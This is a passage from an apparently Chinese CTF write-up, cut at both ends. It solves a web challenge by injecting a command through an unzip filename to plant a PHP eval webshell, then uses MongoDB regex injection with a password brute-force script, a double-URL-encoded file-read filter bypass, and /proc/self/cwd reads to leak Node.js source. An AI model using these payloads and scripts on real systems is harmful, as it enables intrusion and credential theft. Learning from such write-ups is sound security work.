eval($_POST[1]);?&gt;&#39; &gt; /var/www/html/public/1.php</code></p><p>这就是等会执行的命令</p><p><img src="../images/image-20230503193609807.png" alt="image-20230503193609807"></p><p>成功进行执行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$fs = popen(&quot;unzip -oq &quot;. $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix() . $name .&quot; -d &quot; . $this-&gt;driver-&gt;getAdapter()-&gt;getPathPrefix(),&quot;w&quot;);</span><br></pre></td></tr></table></figure><p>这段代码就是把上传文件的压缩文件的地址给解压到当前地址</p><p><code>unzip -oq /xxx/xxx/xxx/1.zip -d /xxx/xxx/xxx/</code></p><p>这个1.zip处就是我们可控的文件名，然后就可以利用分号隔开，然后进行我们想要执行的其他命令了</p><h2 id="d3node"><a href="#d3node" class="headerlink" title="d3node"></a>d3node</h2><p>题目</p><p><img src="../images/image-20230503194127075.png" alt="image-20230503194127075"></p><p>查看第一个hint后，发现是nosql注入里的<strong>MongoDB</strong>注入</p><p><img src="../images/image-20230503194941896.png" alt="image-20230503194941896"></p><p><a href="https://xz.aliyun.com/t/9908#toc-4">Nosql 注入从零到一</a></p><p>可以从这篇文章来进行学习</p><p><img src="../images/image-20230503195510880.png" alt="image-20230503195510880"></p><p>输入过滤的词会输出Hacker</p><p>输入错误的密码是会输出下面的东西</p><p><img src="../images/image-20230503195603571.png" alt="image-20230503195603571"></p><p>使用<code>password[$regex]=.*&amp;username=admin</code></p><p><strong>但是这个方法登录的不是admin用户</strong></p><p><strong>这个就是对密码的正则匹配，这里的话是使用通配符来匹配</strong>(上面给的nosql的文章里讲的很清楚这个正则匹配)</p><p><img src="../images/image-20230504193625735.png" alt="image-20230504193625735"></p><p>这个也行，就是</p><p>盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">dicts = <span class="string">&#x27;0123456789AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> dicts:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;testing&#x27;</span>, s)</span><br><span class="line">        url = <span class="string">&#x27;http://47.102.98.112:32299/user/LoginIndex&#x27;</span></span><br><span class="line">        res = requests.post(url,data=json.dumps(&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;password&#x27;</span>: &#123;<span class="string">&#x27;$regex&#x27;</span>: <span class="string">&#x27;^&#x27;</span> + flag + s&#125;&#125;), headers=&#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hacker&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">            quit()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;invalid&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += s</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;found!!!&#x27;</span>, flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后就跟据invalid的出现的标志来判断密码</p><p>最好爆出密码为  <code>dob2xdriaqpytdyh6jo3</code></p><p>然后进行登录</p><p><img src="../images/image-20230503195900909.png" alt="image-20230503195900909"></p><p>查看源码后发现第二个hint</p><p><img src="../images/image-20230503195943805.png" alt="image-20230503195943805"></p><p><img src="../images/image-20230503201834175.png" alt="image-20230503201834175"></p><p>然后测试了一下是在这个目录下可以进行文件的读取 (<strong>这里会测试时因为提示给的代码中有filename这个参数</strong>)  <strong>req.query.filename</strong></p><p><img src="../images/image-20230503201931320.png" alt="image-20230503201931320"></p><p>不给读取，然后就尝试绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?filename[href]=a&amp;filena</span><br><span class="line">me[origin]=1&amp;filename[protocol]=file:&amp;filename[hostname]=&amp;filename[pathname]=./%25</span><br><span class="line">61pp.js</span><br></pre></td></tr></table></figure><p>这段代码使用了一个JavaScript对象来表示文件路径。其中，”filename”是该对象的属性名，” [href]”、”[origin]”、”[protocol]”、”[hostname]”和”[pathname]”则是该属性下的子属性。具体 来说，它们分别表示文件的链接地址、来源、协议、主机名和文件路径。 这里的%2561其实就是。如果有非ascii进行url加密，则就会变成16进制然后再进行url编码，a的16进 制是61</p><p><strong>其实就是对a进行两次url编码</strong></p><p>然后就可以成功的查看到app.js了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&quot;body-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> stringRandom = <span class="built_in">require</span>(<span class="string">&quot;string-random&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// register router</span></span><br><span class="line"><span class="keyword">const</span> indexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/index&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> userRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/user&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> dashboardIndexRouter = <span class="built_in">require</span>(<span class="string">&quot;./routes/dashboardIndex&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">engine</span>(<span class="string">&#x27;html&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;hbs&#x27;</span>).<span class="property">__express</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>));</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>());</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;static&#x27;</span>)));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">session</span>(&#123;</span><br><span class="line">    <span class="attr">secret</span>: <span class="title function_">stringRandom</span>(<span class="number">32</span>),</span><br><span class="line">    <span class="attr">resave</span>: <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">saveUninitialized</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">cookie</span>: &#123;</span><br><span class="line">        <span class="attr">maxAge</span>: <span class="number">1000</span> * <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="comment">// set router</span></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/&quot;</span>,indexRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/user&quot;</span>,userRouter);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&quot;/dashboardIndex&quot;</span>,dashboardIndexRouter);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>,<span class="function">() =&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on <span class="subst">$&#123;PORT&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后根据这个代码</p><p><img src="../images/image-20230504193939368.png" alt="image-20230504193939368"></p><p><img src="../images/image-20230504194038107.png" alt="image-20230504194038107"></p><p>这就是引入的一个文件，于是我们尝试进行这个文件的读取，看里面有啥功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">一开始还报错是因为没有加后缀.js，就好像访问php页面不加php一样</span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=/proc/self/cwd/routes/dashbo</span><br><span class="line">ardIndex.js</span><br><span class="line"></span><br><span class="line">这个路径可能也是这个框架默认的路径吧，应该和thinkphp差不多</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://139.196.153.118:32707/dashboardIndex/ShowExampleFile?filename=./routes/dashboardIndex.js</span><br><span class="line">上面的二种方法都可以实现</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230504194423815.png" alt="image-20230504194423815"></p><p>读取到的代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cp = <span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&quot;multer&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> upload = <span class="title function_">multer</span>(&#123; <span class="attr">dest</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/tmp&quot;</span>)&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFileData</span>(<span class="params">fileDatas</span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> blacklist = [<span class="string">&#x27;__proto__&#x27;</span>, <span class="string">&#x27;prototype&#x27;</span>, <span class="string">&#x27;constructor&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; blacklist.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileDatas.<span class="title function_">includes</span>(blacklist[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get example file</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/ShowExampleFile&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>([req.<span class="property">query</span>].<span class="title function_">some</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> item &amp;&amp; <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(item).<span class="title function_">includes</span>(<span class="string">&quot;app&quot;</span>)))&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Hacker!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(fs.<span class="title function_">readFileSync</span>(req.<span class="property">query</span>.<span class="property">filename</span> || <span class="string">&quot;./example/example.json&quot;</span>).<span class="title function_">toString</span>());</span><br><span class="line">    &#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Internal server error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Homepage</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/Home&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>:<span class="string">&quot;Welcome back&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/getHint2&quot;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> hintName = <span class="string">&quot;hint2.png&quot;</span>;</span><br><span class="line">    <span class="keyword">const</span> options = &#123;</span><br><span class="line">        <span class="attr">root</span>: path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../hints&quot;</span>)</span><br><span class="line">    &#125;;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(hintName,options,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Get hint2 error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// show uploaded files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/UploadList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/upload&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No uploaded files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: lists,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// show packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/PacksList&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> lists = fs.<span class="title function_">readdirSync</span>(path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs&quot;</span>));</span><br><span class="line">    <span class="keyword">if</span> (lists.<span class="property">length</span> === <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: <span class="string">&quot;No packed files&quot;</span>,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> result = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; lists.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        result += <span class="string">&quot;&lt;a href=&#x27;/dashboardIndex/DownloadPackage?name=&quot;</span> + lists[i] + <span class="string">&quot;&#x27;&gt;&quot;</span> + lists[i] + <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&quot;dashboardIndex&quot;</span>,&#123;<span class="attr">message</span>: result,<span class="attr">session_user</span>:<span class="string">&quot;Hello,&quot;</span>+req.<span class="property">session</span>.<span class="property">user</span>&#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Download packed files</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/DownloadPackage&quot;</span>,<span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">session</span>.<span class="property">is_login</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&quot;/user/LoginIndex&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">query</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">query</span>.<span class="property">name</span> === <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">        req.<span class="property">query</span>.<span class="property">name</span> = <span class="string">&quot;example.tgz&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> packageName = req.<span class="property">query</span>.<span class="property">name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;/&quot;</span>) !== -<span class="number">1</span> || packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;..&quot;</span>) !== -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File path invalid&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (packageName.<span class="title function_">indexOf</span>(<span class="string">&quot;.tgz&quot;</span>) === -<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;Not a package file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> packagePath = path.<span class="title function_">join</span>(__dirname,<span class="string">&quot;../public/packs/&quot;</span>,packageName);</span><br><span class="line">    <span class="keyword">if</span>(!fs.<span class="title function_">existsSync</span>(packagePath)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">send</span>(<span class="string">&quot;File not found&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> contentType = <span class="string">&quot;application/x-gtar&quot;</span>;</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-disposition&quot;</span>, <span class="string">&quot;attachment; filename=&quot;</span> + packageName);</span><br><span class="line">    res.<span class="title function_">setHeader</span>(<span class="string">&quot;Content-type&quot;</span>, contentType);</span><br><span class="line">    res.<span class="title function_">download</span>(packagePath,packageName,<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (err)&#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Download failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Upload files</span></span><br><span class="line">router.<span class="title function_">all</span>(<span 